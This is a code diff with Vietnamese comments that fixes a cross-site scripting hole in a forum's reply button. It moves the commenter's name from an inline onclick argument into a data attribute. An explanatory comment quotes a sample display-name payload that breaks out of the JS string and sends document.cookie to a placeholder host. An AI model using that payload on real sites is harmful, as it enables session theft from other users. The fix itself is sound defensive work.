@@ -1529,7 +1529,10 @@ function skSkillToggle(row) {
           '<div class="fpc-cmt-reaction-picker">' + rPickerHtml + '</div>' +
           '</div>' +
           rSummaryHtml +
-          '<button class="fpc-cmt-act-btn fpc-cmt-reply-btn" onclick="forumToggleReply(\'' + postId + '\',\'' + c.id + '\',\'' + escHtml(r.author) + '\')">Trả lời</button>' +
+          // Tên người trả lời đi qua THUỘC TÍNH `data-mention`, không qua đối số
+          // JS — xem chú thích dài ở `forumToggleReply`.
+          '<button class="fpc-cmt-act-btn fpc-cmt-reply-btn" data-mention="' + escHtml(r.author) +
+          '" onclick="forumToggleReply(\'' + postId + '\',\'' + c.id + '\', this.dataset.mention)">Trả lời</button>' +
           '</div>' +
           '</div>' +
           '</div>'
@@ -1556,7 +1559,8 @@ function skSkillToggle(row) {
         '<div class="fpc-cmt-reaction-picker">' + pickerHtml + '</div>' +
         '</div>' +
         reactSummaryHtml +
-        '<button class="fpc-cmt-act-btn fpc-cmt-reply-btn" onclick="forumToggleReply(\'' + postId + '\',\'' + c.id + '\',\'' + escHtml(c.author) + '\')">Trả lời</button>' +
+        '<button class="fpc-cmt-act-btn fpc-cmt-reply-btn" data-mention="' + escHtml(c.author) +
+        '" onclick="forumToggleReply(\'' + postId + '\',\'' + c.id + '\', this.dataset.mention)">Trả lời</button>' +
         '</div>' +
         (repliesHtml ? '<div class="fpc-replies-list">' + repliesHtml + '</div>' : '') +
         '<div class="fpc-reply-input-row" id="fpc-reply-row-' + postId + '-' + c.id + '" style="display:none">' +
@@ -1754,7 +1758,28 @@ function skSkillToggle(row) {
     });
   };
 
+  /* `mentionName` tới từ `this.dataset.mention` của chính cái nút, KHÔNG phải từ
+     một đối số viết thẳng vào `onclick`. Trước 04/09/2026 nó là:
+
+         onclick="forumToggleReply('12','34','" + escHtml(c.author) + "')"
+
+     Đặt một hàm thoát HTML vào bên trong một chuỗi JS thì trình duyệt GIẢI MÃ
+     THỰC THỂ TRƯỚC KHI BIÊN DỊCH JS — nên `escHtml` ở đó không những vô dụng,
+     nó bị hoàn tác đúng bằng chính bước giải mã ấy. Một học viên đổi tên mình
+     thành `x');fetch('//máy-tôi/'+document.cookie);//` là chạy được mã trên
+     trình duyệt của MỌI người mở bài viết đó.
+
+     Đây là hàng rào đặc quyền THẤP NHẤT trong cả sản phẩm: không cần vai gì,
+     chỉ cần một tài khoản học viên và ô "Họ tên" trong trang cá nhân — tên chỉ
+     bị kiểm ĐỘ DÀI (accounts/validators.py::validate_name_field).
+
+     Không thể ép khuôn tên người như đã ép `courses.id` thành slug: dấu nháy
+     trong tên người là bình thường. Nên phải bỏ hẳn ngữ cảnh JS đi. Trong
+     THUỘC TÍNH thì `escHtml` là đúng công cụ, và tên đi tới đây nguyên vẹn
+     (giải mã thực thể trả lại đúng ký tự gốc) — `placeholder` và
+     `dataset.mention` dưới đây đều là gán thuộc tính DOM, không phải HTML. */
   window.forumToggleReply = function (postId, cmtId, mentionName) {
+    mentionName = mentionName == null ? '' : String(mentionName);
     var row = document.getElementById('fpc-reply-row-' + postId + '-' + cmtId);
     if (!row) return;
     var inp = document.getElementById('fpc-reply-inp-' + postId + '-' + cmtId);
